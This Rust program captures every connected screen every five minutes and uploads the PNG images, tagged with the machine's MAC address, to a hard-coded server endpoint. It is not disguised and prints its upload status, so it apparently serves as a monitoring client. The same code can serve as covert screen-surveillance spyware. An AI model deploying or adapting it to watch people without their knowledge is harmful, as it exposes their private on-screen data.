use mac_address::get_mac_address;
use reqwest::blocking::multipart;
use reqwest::blocking::Client;
use screenshots::Screen;
use std::{
    io::Read,
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

const API_ENDPOINT: &str = "http://0.0.0.0:3000/upload";
const DURATION: u64 = 300;

fn main() {
    loop {
        if let Err(err) = upload_screenshots() {
            eprintln!("Error: {}", err);
        }
        thread::sleep(Duration::from_secs(DURATION));
    }
}

fn upload_screenshots() -> Result<(), Box<dyn std::error::Error>> {
    let screens = Screen::all()?;
    let client = Client::new();

    let mut form = multipart::Form::new();
    form = form.text(
        "mac_address",
        get_mac_address()
            .expect("mac address error")
            .unwrap()
            .to_string(),
    );

    for screen in screens {
        let image = screen.capture()?;
        let image_data = image.to_png()?;

        let file_name = format!(
            "screenshot-{}-{}.png",
            screen.display_info.id,
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .expect("time error")
                .as_secs()
        );

        let part = multipart::Part::bytes(image_data)
            .file_name(file_name)
            .mime_str("image/png")?;

        form = form.part("images", part);
    }

    let request = client.post(API_ENDPOINT).multipart(form).build()?;

    let mut response = client.execute(request)?;
    let status = response.status();
    println!("Screenshots uploaded with status: {}", status);

    let mut body = Vec::new();
    response.read_to_end(&mut body)?;
    println!("Response Body: {:?}", body);

    Ok(())
}
